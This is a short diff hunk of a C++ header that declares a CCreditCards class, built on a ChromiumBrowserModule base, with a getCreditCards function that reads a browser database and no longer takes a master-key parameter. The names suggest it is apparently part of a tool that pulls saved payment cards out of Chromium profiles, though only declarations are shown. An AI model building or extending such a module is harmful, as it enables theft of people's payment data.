@@ -21,7 +21,7 @@ class CCreditCards : public ChromiumBrowserModule {
 public:
     void execute(const fs::path &root, const std::string &name, const fs::path &path) override;
 private:
-    static std::list<CreditCard> getCreditCards(const fs::path &db_path, const std::vector<BYTE> &master_key);
+    std::list<CreditCard> getCreditCards(const fs::path &db_path);
 };
 
 
